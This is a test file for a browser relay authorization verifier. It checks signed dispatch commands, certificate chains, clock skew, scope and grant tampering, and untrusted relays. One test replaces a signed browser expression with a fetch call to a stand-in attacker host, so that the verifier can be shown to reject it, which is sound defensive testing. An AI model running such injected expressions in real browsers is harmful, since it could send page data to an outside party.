import { describe, expect, it } from 'vitest';
import { browserBase64, canonicalBrowserAuthorization, canonicalBrowserGrant, type RuntimeBrowserAuthorization, type RuntimeBrowserAuthorizationBody } from '@gitspace/protocol-runtime';
import { verifyRelayAuthorization } from '../src/browser-relay-authorization.js';

async function fixture(authorityAgeMs = 0) {
  const root = await crypto.subtle.generateKey('Ed25519', true, ['sign', 'verify']) as CryptoKeyPair;
  const workspace = await crypto.subtle.generateKey('Ed25519', true, ['sign', 'verify']) as CryptoKeyPair;
  const now = Date.now(); const issuedAt = new Date(now - 1000).toISOString(); const expiresAt = new Date(now + 60000).toISOString();
  const scope = { projectId: 'project', workspaceId: 'workspace', conversationId: 'conversation', machineId: 'machine', attachmentId: 'attachment', generation: 2, taskId: 'task', requestId: 'request', attemptId: crypto.randomUUID() };
  const grantBody = { projectId:scope.projectId,workspaceId:scope.workspaceId,conversationId:scope.conversationId,machineId:scope.machineId,attachmentId:scope.attachmentId,generation:scope.generation, groupId: crypto.randomUUID(), groupName:'Workspace', source: 'relay' as const, origins:['example.com'], expiresAt };
  const certificateBody = { accountId: 'account', projectId: 'project', workspaceId: 'workspace', publicKey: browserBase64(new Uint8Array(await crypto.subtle.exportKey('raw', workspace.publicKey))), issuedAt: new Date(Date.parse(issuedAt) - authorityAgeMs).toISOString(), expiresAt };
  const certificatePayload = canonicalBrowserAuthorization(certificateBody).replace('gitspace.browser.authorization.v1\n', 'gitspace.browser.authority.v1\n');
  const authority = { body: certificateBody, signature: browserBase64(new Uint8Array(await crypto.subtle.sign('Ed25519', root.privateKey, new TextEncoder().encode(certificatePayload)))) };
  const grant = {body:grantBody,authority,signature:browserBase64(new Uint8Array(await crypto.subtle.sign('Ed25519',workspace.privateKey,new TextEncoder().encode(canonicalBrowserGrant(grantBody)))))};
  const body: RuntimeBrowserAuthorizationBody = { scope, issuedAt, expiresAt, dispatch: { version: 1, tool: 'browser', deadlineAt: expiresAt, replay: 'unsafe' }, command: { type: 'execute', args: { action: 'evaluate', source:'relay', targetId:'target', expression: 'document.title' }, grant } };
  const sign = async (value: RuntimeBrowserAuthorizationBody): Promise<RuntimeBrowserAuthorization> => ({ body: value, authority, signature: browserBase64(new Uint8Array(await crypto.subtle.sign('Ed25519', workspace.privateKey, new TextEncoder().encode(canonicalBrowserAuthorization(value))))) });
  return { body, sign, trust: { accountId: 'account', publicKey: browserBase64(new Uint8Array(await crypto.subtle.exportKey('raw', root.publicKey))) }, now };
}

describe('extension cloud authorization boundary', () => {
  it('accepts a browser clock two minutes behind without extending expiry', async () => {
    const f = await fixture();
    const authorization = await f.sign(f.body);
    const browserNow = Date.parse(f.body.issuedAt) - 120_000;
    expect((await verifyRelayAuthorization(authorization, f.trust, browserNow)).scope).toEqual(f.body.scope);
    await expect(verifyRelayAuthorization(authorization, f.trust, Date.parse(f.body.expiresAt))).rejects.toThrow();
  });
  it.each([
    { boundary: 'authority', authorityAgeMs: 0 },
    { boundary: 'authorization', authorityAgeMs: 300_000 },
  ])('reports excessive clock skew at the $boundary boundary', async ({ authorityAgeMs }) => {
    const f = await fixture(authorityAgeMs);
    await expect(verifyRelayAuthorization(await f.sign(f.body), f.trust, Date.parse(f.body.issuedAt) - 120_001)).rejects.toThrow();
  });
  it('accepts the pinned certificate chain and rejects an expression changed after signing', async () => {
    const f = await fixture(); const authorization = await f.sign(f.body);
    expect((await verifyRelayAuthorization(authorization, f.trust, f.now)).command).toEqual(f.body.command);
    if (authorization.body.command.type === 'execute' && authorization.body.command.args.action === 'evaluate') authorization.body.command.args.expression = 'fetch("https://attacker.example")';
    await expect(verifyRelayAuthorization(authorization, f.trust, f.now)).rejects.toThrow('Invalid cloud authorization');
  });
  it('rejects a valid workspace signature outside its account certificate scope', async () => {
    const f = await fixture(); f.body.scope.workspaceId = 'other-workspace';
    await expect(verifyRelayAuthorization(await f.sign(f.body), f.trust, f.now)).rejects.toThrow('scope mismatch');
  });
  it('rejects a modified group grant even when the containing dispatch is freshly signed', async () => {
    const f = await fixture(); if (f.body.command.type === 'execute') f.body.command.grant.body.origins = ['*'];
    await expect(verifyRelayAuthorization(await f.sign(f.body), f.trust, f.now)).rejects.toThrow('Invalid group grant signature');
  });
  it('rejects expired authorization even while the certificate and grant remain live', async () => {
    const f = await fixture(); f.body.expiresAt = new Date(f.now - 1).toISOString();
    await expect(verifyRelayAuthorization(await f.sign(f.body), f.trust, f.now)).rejects.toThrow('Invalid cloud authorization');
  });
  it('does not trust the signing authority supplied by an arbitrary relay', async () => {
    const f = await fixture(); const attacker = await fixture();
    await expect(verifyRelayAuthorization(await attacker.sign(attacker.body), f.trust, f.now)).rejects.toThrow('Untrusted cloud authority');
  });
});
